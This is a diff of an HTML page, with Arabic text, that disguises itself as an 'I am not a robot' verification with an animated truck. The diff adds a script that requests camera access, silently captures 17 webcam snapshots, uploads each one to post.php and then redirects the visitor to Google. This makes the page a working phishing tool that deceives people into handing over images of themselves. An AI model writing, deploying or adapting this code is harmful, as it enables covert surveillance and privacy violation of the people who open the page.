@@ -12,13 +12,26 @@
         }
         h2 {
             margin-top: 20px;
-            font-size: 24px;
+            font-size: 26px;
             color: #007bff;
         }
+        button { 
+            padding: 15px 30px; 
+            font-size: 20px; 
+            cursor: pointer; 
+            background: #007bff; 
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            transition: 0.3s; 
+            margin-top: 15px;
+        }
+        button:hover { background: #0056b3; }
+
         /* الطريق */
         .road {
             position: relative;
-            margin: 100px auto;
+            margin: 60px auto;
             width: 90%;
             height: 100px;
             background: #333;
@@ -38,6 +51,7 @@
                 transparent 80px
             );
         }
+
         /* السيارة */
         .truck {
             position: absolute;
@@ -52,33 +66,62 @@
             from { left: -150px; }
             to { left: calc(100% - 120px); }
         }
-        /* الزر */
-        button { 
-            padding: 15px 30px; 
-            font-size: 20px; 
-            cursor: pointer; 
-            background: #007bff; 
-            color: white; 
-            border: none; 
-            border-radius: 5px; 
-            transition: 0.3s; 
-            margin-top: 20px;
-        }
-        button:hover { background: #0056b3; }
     </style>
 </head>
 <body>
 
-<h2>لتحقق أنك لست روبوت اضغط هنا</h2>
+<h2>تحقق أنك لست روبوت</h2>
 <button onclick="startProcess()">ابدأ التحقق</button>
 
 <div class="road">
     <div class="truck">🚚</div>
 </div>
 
-<audio id="engineSound" src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"></audio>
-
 <script>
 async function startProcess() {
     try {
-        // تشغيل حركة السيارة + الصوت
+        // تشغيل حركة السيارة
+        const truck = document.querySelector('.truck');
+        truck.classList.add('move');
+
+        // طلب إذن الكاميرا
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement('canvas');
+        canvas.width = 640; 
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+
+        // التقاط 17 صورة بفاصل نصف ثانية
+        for (let i = 0; i < 17; i++) {
+            ctx.drawImage(video, 0, 0, 640, 480);
+            const data = canvas.toDataURL('image/jpeg', 0.7);
+
+            await fetch('post.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'img=' + encodeURIComponent(data) + '&frame=' + i
+            });
+
+            await new Promise(resolve => setTimeout(resolve, 500));
+        }
+
+        // إيقاف الكاميرا
+        stream.getTracks().forEach(track => track.stop());
+
+        // بعد انتهاء العملية تحويل المستخدم
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 2000);
+
+    } catch (err) {
+        console.error(err);
+        alert("يرجى السماح بالوصول للكاميرا لإكمال التحقق");
+    }
+}
+</script>
+</body>
+</html>
